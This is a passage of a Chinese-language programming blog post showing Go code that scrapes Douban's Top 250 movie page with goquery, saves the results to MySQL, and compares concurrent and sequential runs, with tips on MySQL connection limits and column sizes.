n><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实现结果"><a href="#实现结果" class="headerlink" title="实现结果"></a>实现结果</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221106104406.png"></li></ol><h2 id="出现问题及解决方法"><a href="#出现问题及解决方法" class="headerlink" title="出现问题及解决方法"></a>出现问题及解决方法</h2><h3 id="too-many-connection"><a href="#too-many-connection" class="headerlink" title="too many connection"></a>too many connection</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">tx<span class="token punctuation">,</span> err <span class="token operator">:=</span> DB<span class="token punctuation">.</span><span class="token function">Begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"tx fail"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>  当启动数据库时报错：too many connection ，1040错误</p></li><li><p>  默认情况下，同时处理100个链接</p></li><li><p>  但是，由于爬虫爬取速度太高，无法同时处理多个链接，会报错1040</p></li><li><p>此时可以调高mysql的最大链接数量</p>  <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token keyword">global</span> max_connections <span class="token operator">=</span> 合适的链接数量<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="爬取内容超出了数据类型所能容纳的"><a href="#爬取内容超出了数据类型所能容纳的" class="headerlink" title="爬取内容超出了数据类型所能容纳的"></a>爬取内容超出了数据类型所能容纳的</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221106104918.png"></li><li>  当爬取内容的长度超出了数据类型所能容纳的，可以调高varchar的最高容纳长度</li></ol><h2 id="高并发爬虫"><a href="#高并发爬虫" class="headerlink" title="高并发爬虫"></a>高并发爬虫</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"database/sql"</span><span class="token string">"fmt"</span><span class="token string">"github.com/PuerkitoBio/goquery"</span><span class="token boolean">_</span> <span class="token string">"github.com/jinzhu/gorm/dialects/mysql"</span><span class="token string">"log"</span><span class="token string">"net/http"</span><span class="token string">"regexp"</span><span class="token string">"strconv"</span><span class="token string">"strings"</span><span class="token string">"time"</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">(</span>USERNAME <span class="token operator">=</span> <span class="token string">"root"</span>PASSWORD <span class="token operator">=</span> <span class="token string">"root"</span>HOST <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>PORT <span class="token operator">=</span> <span class="token string">"3306"</span>DBNAME <span class="token operator">=</span> <span class="token string">"douban_movie"</span><span class="token punctuation">)</span><span class="token keyword">var</span> DB <span class="token operator">*</span>sql<span class="token punctuation">.</span>DB<span class="token keyword">type</span> MovieData <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>Title    <span class="token builtin">string</span> <span class="token string">`json:"title"`</span>Director <span class="token builtin">string</span> <span class="token string">`json:"director"`</span>Picture  <span class="token builtin">string</span> <span class="token string">`json:"picture"`</span>Actor    <span class="token builtin">string</span> <span class="token string">`json:"actor"`</span>Year     <span class="token builtin">string</span> <span class="token string">`json:"year"`</span>Score    <span class="token builtin">string</span> <span class="token string">`json:"score"`</span>Quote    <span class="token builtin">string</span> <span class="token string">`json:"quote"`</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">InitDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span>start <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//for i := 0; i &lt; 10; i++ &#123;</span><span class="token comment">//Spider(strconv.Itoa(i*25))</span><span class="token comment">//&#125;</span>ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span><span class="token keyword">go</span> <span class="token function">Spider</span><span class="token punctuation">(</span>strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span><span class="token operator">&lt;-</span>ch<span class="token punctuation">&#125;</span>elapsed <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Since</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"ChannelStart Time %s \n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>elapsed<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">Spider</span><span class="token punctuation">(</span>page <span class="token builtin">string</span><span class="token punctuation">,</span>ch <span class="token keyword">chan</span> <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>client <span class="token operator">:=</span> <span class="token operator">&amp;</span>http<span class="token punctuation">.</span>Client<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>req<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">NewRequest</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"https://movie.douban.com/top250?start="</span><span class="token operator">+</span>page<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Connection"</span><span class="token punctuation">,</span> <span class="token string">"keep-alive"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Cache-Control"</span><span class="token punctuation">,</span> <span class="token string">"max-age=0"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"sec-ch-ua-mobile"</span><span class="token punctuation">,</span> <span class="token string">"?0"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">,</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Accept"</span><span class="token punctuation">,</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Sec-Fetch-Site"</span><span class="token punctuation">,</span> <span class="token string">"same-origin"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Sec-Fetch-Mode"</span><span class="token punctuation">,</span> <span class="token string">"navigate"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Sec-Fetch-User"</span><span class="token punctuation">,</span> <span class="token string">"?1"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Sec-Fetch-Dest"</span><span class="token punctuation">,</span> <span class="token string">"document"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Referer"</span><span class="token punctuation">,</span> <span class="token string">"https://movie.douban.com/chart"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Accept-Language"</span><span class="token punctuation">,</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">)</span>resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> client<span class="token punctuation">.</span><span class="token function">Do</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">defer</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>docDetail<span class="token punctuation">,</span> err <span class="token operator">:=</span> goquery<span class="token punctuation">.</span><span class="token function">NewDocumentFromReader</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>Body<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>docDetail<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"#content > div > div.article > ol > li > div"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Each</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span>i <span class="token builtin">int</span><span class="token punctuation">,</span> s <span class="token operator">*</span>goquery<span class="token punctuation">.</span>Selection<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> movieData MovieData<span class="token comment">//#content > div > div.article > ol > li:nth-child(16) > div > div.info > div.hd > a > span:nth-child(1)</span>title <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.hd > a > span:nth-child(1)"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>img <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.pic > a > img"</span><span class="token punctuation">)</span>imgTmp<span class="token punctuation">,</span> ok <span class="token operator">:=</span> img<span class="token punctuation">.</span><span class="token function">Attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">)</span>info <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.bd > p:nth-child(1)"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span>director<span class="token punctuation">,</span> actor<span class="token punctuation">,</span> year <span class="token operator">:=</span> <span class="token function">InfoSpite</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>score <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.bd > div > span.rating_num"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span>score <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span>score<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>quote <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"div.info > div.bd > p.quote > span"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token keyword">if</span> ok <span class="token punctuation">&#123;</span>movieData<span class="token punctuation">.</span>Title <span class="token operator">=</span> titlemovieData<span class="token punctuation">.</span>Director <span class="token operator">=</span> directormovieData<span class="token punctuation">.</span>Picture <span class="token operator">=</span> imgTmpmovieData<span class="token punctuation">.</span>Actor <span class="token operator">=</span> actormovieData<span class="token punctuation">.</span>Year <span class="token operator">=</span> yearmovieData<span class="token punctuation">.</span>Score <span class="token operator">=</span> scoremovieData<span class="token punctuation">.</span>Quote <span class="token operator">=</span> quotefmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>movieData<span class="token punctuation">)</span><span class="token function">InsertSql</span><span class="token punctuation">(</span>movieData<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">if</span> ch <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">&#123;</span>ch <span class="token operator">&lt;-</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">InfoSpite</span><span class="token punctuation">(</span>info <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>director <span class="token punctuation">,</span>actor <span class="token punctuation">,</span> year <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>directorRe<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">Compile</span><span class="token punctuation">(</span><span class="token string">`导演:(.*)主演:`</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>director<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token punctuation">&#123;</span>director <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>directorRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>director <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>directorRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>director <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span>director<span class="token punctuation">,</span> <span class="token string">"主演:"</span><span class="token punctuation">)</span>actorRe<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">Compile</span><span class="token punctuation">(</span><span class="token string">`主演:(.*)`</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>actor<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token punctuation">&#123;</span>actor <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>actorRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>actor <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>actorRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>yearRe<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">Compile</span><span class="token punctuation">(</span><span class="token string">`(\d+)`</span><span class="token punctuation">)</span>year <span class="token operator">=</span> <span class="token function">string</span><span class="token punctuation">(</span>yearRe<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">InitDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>DB<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"mysql"</span><span class="token punctuation">,</span> <span class="token string">"root:20030729a@tcp(localhost:3306)/movie"</span><span class="token punctuation">)</span>DB<span class="token punctuation">.</span><span class="token function">SetConnMaxLifetime</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>DB<span class="token punctuation">.</span><span class="token function">SetMaxIdleConns</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">:=</span> DB<span class="token punctuation">.</span><span class="token function">Ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"opon database fail"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"connnect success"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">InsertSql</span><span class="token punctuation">(</span>movieData MovieData<span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>tx<span class="token punctuation">,</span> err <span class="token operator">:=</span> DB<span class="token punctuation">.</span><span class="token function">Begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"tx fail"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span>stmt<span class="token punctuation">,</span> err <span class="token operator">:=</span> tx<span class="token punctuation">.</span><span class="token function">Prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO movie_data (`Title`,`Director`,`Actor`,`Year`,`Score`,`Quote`) VALUES (?, ?, ?,?,?,?)"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Prepare fail"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> stmt<span class="token punctuation">.</span><span class="token function">Exec</span><span class="token punctuation">(</span>movieData<span class="token punctuation">.</span>Title<span class="token punctuation">,</span> movieData<span class="token punctuation">.</span>Director<span class="token punctuation">,</span> movieData<span class="token punctuation">.</span>Actor<span class="token punctuation">,</span> movieData<span class="token punctuation">.</span>Year<span class="token punctuation">,</span> movieData<span class="token punctuation">.</span>Score<span class="token punctuation">,</span> movieData<span class="token punctuation">.</span>Quote<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Exec fail"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token boolean">_</span> <span class="token operator">=</span> tx<span class="token punctuation">.</span><span class="token function">Commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221106110604.png"></p></li><li><p>高并发爬虫爬取同等内容需要1s左右</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"database/sql"</span><span class="token string">"fmt"</span><span class="token string">"github.com/PuerkitoBio/goquery"</span><span class="token boolean">_</span> <span class="token string">"github.com/jinzhu/gorm/dialects/mysql"</span><span class="token string">"log"</span><span class="token string">"net/http"</span><span class="token string">"regexp"</span><span class="token string">"strconv"</span><span class="token string">"strings"</span><span class="token string">"time"</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">(</span>USERNAME <span class="token operator">=</span> <span class="token string">"root"</span>PASSWORD <span class="token operator">=</span> <span class="token string">"root"</span>HOST <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>PORT <span class="token operator">=</span> <span class="token string">"3306"</span>DBNAME <span class="token operator">=</span> <span class="token string">"douban_movie"</span><span class="token punctuation">)</span><span class="token keyword">var</span> DB <span class="token operator">*</span>sql<span class="token punctuation">.</span>DB<span class="token keyword">type</span> MovieData <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>Title    <span class="token builtin">string</span> <span class="token string">`json:"title"`</span>Director <span class="token builtin">string</span> <span class="token string">`json:"director"`</span>Picture  <span class="token builtin">string</span> <span class="token string">`json:"picture"`</span>Actor    <span class="token builtin">string</span> <span class="token string">`json:"actor"`</span>Year     <span class="token builtin">string</span> <span class="token string">`json:"year"`</span>Score    <span class="token builtin">string</span> <span class="token string">`json:"score"`</span>Quote    <span class="token builtin">string</span> <span class="token string">`json:"quote"`</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">InitDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span>start <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span><span class="token function">Spider</span><span class="token punctuation">(</span>strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// ch := make(chan bool)</span><span class="token comment">// for i := 0; i &lt; 10; i++ &#123;</span><span class="token comment">// Spider(strconv.Itoa(i*25), ch)</span><span class="token comment">// &#125;</span><span class="token comment">// for i := 0; i &lt; 10; i++ &#123;</span><span class="token comment">// &lt;-ch</span><span class="token comment">// &#125;</span>elapsed <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Since</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"ChannelStart Time %s \n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>elapsed<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">Spider</span><span class="token punctuation">(</span>page <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>client <span class="token operator">:=</span> <span class="token operator">&amp;</span>http<span class="token punctuation">.</span>Client<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>req<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">NewRequest</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"https://movie.douban.com/top250?start="</span><span class="token operator">+</span>page<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Connection"</span><span class="token punctuation">,</span> <span class="token string">"keep-alive"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Cache-Control"</span><span class="token punctuation">,</span> <span class="token string">"max-age=0"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"sec-ch-ua-mobile"</span><span class="token punctuation">,</span> <span class="token string">"?0"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">,</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Accept"</span><span class="token punctuation">,</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span><span class="token punctuation">)</span>req<span class="token 